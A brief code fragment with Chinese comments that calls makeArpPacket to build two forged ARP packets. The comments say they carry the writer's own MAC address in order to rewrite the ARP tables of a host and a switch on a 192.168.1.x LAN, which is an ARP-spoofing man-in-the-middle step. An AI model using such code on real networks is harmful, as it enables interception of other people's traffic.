...
{     
	...
	//                      （欺骗成我的MAC地址）
    makeArpPacket(ARPPacket_A, "DC53602FC56A", "192.168.1.1"  , "000C29E9824C", "192.168.1.31");//‎把主机114的arp表改掉了
    makeArpPacket(ARPPacket_B, "DC53602FC56A", "192.168.1.31", "3C46D8DF3AF0", "192.168.1.1");  //‎把交换机 的arp表改掉了
